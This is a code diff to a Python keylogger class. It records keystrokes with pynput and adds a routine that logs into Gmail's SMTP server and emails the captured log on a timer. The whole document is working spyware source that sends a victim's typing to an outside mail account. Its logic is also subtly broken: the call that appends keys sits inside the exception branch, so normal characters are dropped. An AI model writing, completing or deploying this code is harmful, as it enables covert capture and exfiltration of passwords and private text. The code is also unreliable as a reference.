@@ -5,32 +5,39 @@ Keylogger class definition
 
 
 from pynput import keyboard
-import threading
-
-
-log = ""
-
+import threading, smtplib
 
 class Keylogger:
-    def __init__(self):
-        pass
+    def __init__(self, interval, email, password):
+        self.log = "Keylogger started"
+        self.interval, self.email, self.password = interval, email, password
 
-    
+    def append_to_log(self, string):
+        self.log = self.log + string
+
+
     def process_key(self, key):
-        global log
         try:
-            log = log + str(key.char)
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                log = log + " "
+                current_key = " "
             else:
-                log = log + " " + str(key) + " "
+                current_key = " " + str(key) + " "
+            self.append_to_log(current_key)
+
+    def send_to_email(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
 
     def report(self):
-        global log
-        log = ""
-        timer = threading.Timer(5, self.report)
+        self.send_to_email(self.email, self.password, "\n\n" + self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
 
 
